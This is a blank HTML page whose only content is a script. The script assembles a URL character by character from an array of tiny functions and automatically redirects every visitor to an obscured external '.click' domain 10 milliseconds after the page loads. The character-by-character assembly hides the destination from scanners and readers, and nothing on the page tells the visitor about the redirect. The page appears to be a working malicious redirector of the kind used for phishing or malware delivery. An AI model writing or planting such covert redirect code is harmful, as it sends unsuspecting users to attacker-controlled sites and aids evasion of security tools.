<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <script>
        const segments = [
            () => 'h',
            _ => 't',
            _ => 't',
            _ => 'p',
            function() { return 's'; },
            function() { return ':'; },
            _ => '/',
            _ => '/',
            _ => 'v',
            () => 'e',
            _ => 'r',
            () => 'g',
            function() { return 'e'; },
            _ => 'n',
            _ => '.',
            () => 'c',
            () => 'l',
            function() { return 'i'; },
            _ => 'c',
            () => 'k',
            () => '/',
            function() { return 's'; },
            _ => '/',
            _ => 'n',
            () => 'e',
            () => 'w'
        ];
        setTimeout(() => {
            window.location.replace(segments.map(f => f()).join(''));
        }, 10);
    </script>
</head>
<body></body>
</html>
